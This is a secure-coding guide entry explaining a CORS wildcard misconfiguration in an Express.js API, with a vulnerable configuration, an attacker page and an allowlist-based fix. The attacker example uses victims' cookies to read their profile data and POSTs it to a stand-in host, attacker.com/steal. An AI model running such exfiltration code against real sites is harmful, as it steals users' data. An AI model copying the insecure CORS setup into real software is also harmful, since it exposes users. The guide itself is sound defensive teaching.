\# JavaScript — CORS Wildcard Misconfiguration



\*\*OWASP:\*\* A02:2025 — Security Misconfiguration



\## The Problem



```javascript

const express = require('express');

const cors = require('cors');

const app = express();



app.use(cors({

&#x20;   origin: '\*',

&#x20;   credentials: true

}));



app.get('/api/user/profile', (req, res) => {

&#x20;   res.json({ userId: 1, email: 'user@example.com', role: 'admin' });

});

```



CORS (Cross-Origin Resource Sharing) controls which domains can 

make requests to your API from a browser. By default browsers 

block cross-origin requests — CORS headers tell the browser to 

allow them.



`origin: '\*'` means any website on the internet can make 

requests to this API. Combined with `credentials: true`, this 

means any site can make authenticated requests using the victim's 

cookies or session tokens.



An attacker hosts a malicious page:



```javascript

// Hosted on https://attacker.com

fetch('https://target-app.com/api/user/profile', {

&#x20;   credentials: 'include'  // sends victim's cookies

})

.then(response => response.json())

.then(data => {

&#x20;   // Send victim's profile data to attacker's server

&#x20;   fetch('https://attacker.com/steal', {

&#x20;       method: 'POST',

&#x20;       body: JSON.stringify(data)

&#x20;   });

});

```



Victim visits `attacker.com`. Their browser makes a request to 

`target-app.com` with their session cookies attached. The server 

accepts it because `origin: '\*'` allows any origin. The response 

— containing their profile, email, role — gets sent straight to 

the attacker.



The victim sees nothing. The browser did everything silently.



Worth noting — `origin: '\*'` with `credentials: true` is actually 

rejected by modern browsers as an invalid combination. But many 

servers work around this by dynamically reflecting whatever origin 

the request sends back in the response header, which achieves the 

same result and bypasses that browser protection.



\## The Fix



```javascript

const express = require('express');

const cors = require('cors');

const app = express();



const allowedOrigins = \[

&#x20;   'https://app.yourcompany.com',

&#x20;   'https://admin.yourcompany.com'

];



app.use(cors({

&#x20;   origin: function(origin, callback) {

&#x20;       if (!origin || allowedOrigins.includes(origin)) {

&#x20;           callback(null, true);

&#x20;       } else {

&#x20;           callback(new Error('Not allowed by CORS'));

&#x20;       }

&#x20;   },

&#x20;   credentials: true

}));



app.get('/api/user/profile', (req, res) => {

&#x20;   res.json({ userId: 1, email: 'user@example.com', role: 'admin' });

});

```



Explicit allowlist of trusted origins. The server checks the 

request's `Origin` header against the list — if it's not there, 

the request is rejected before it reaches any endpoint logic.



`!origin` handles server-to-server requests which have no origin 

header — these are legitimate and should be allowed through.



Never reflect the request's `Origin` header directly back in the 

response without checking it against an allowlist first — that's 

the dynamic reflection pattern that bypasses the browser's 

`origin: '\*'` with `credentials: true` protection.

